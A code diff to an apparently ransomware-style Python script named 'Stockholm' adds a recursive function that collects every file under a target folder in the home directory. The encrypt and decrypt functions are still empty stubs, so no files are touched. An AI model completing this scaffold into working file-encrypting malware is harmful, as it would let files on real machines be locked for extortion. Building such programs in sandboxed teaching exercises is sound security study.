@@ -19,18 +19,33 @@ def decrypt():
 def encrypt():
 	return
 
+def get_targets(dir_path, files):
+	contents = os.listdir(dir_path)
+	for f in contents:
+		filename = dir_path + "/" + f
+		if os.path.isfile(filename):
+			files.append(filename)
+		else:
+			get_targets(filename, files)
+
 def check_directory():
 	try:
 		home = os.path.expanduser('~')
-		directory = home + "/" + TARGET_DIR
-		if not os.path.exists(directory):
+		dir_path = home + "/" + TARGET_DIR
+		if not os.path.exists(dir_path):
 			error_exit(f"directory '{TARGET_DIR}' does not exist")
+		return dir_path
 	except Exception as e:
 		error_exit(e)
 
 def Stockholm():
-	check_directory()
-	
+	dir_path = check_directory()
+	files = []
+	get_targets(dir_path, files)
+	print(files)
+	if not files:
+		error_exit(f"target files does not exist")
+
 	if Flags.reverse:
 		encrypt()
 	else:
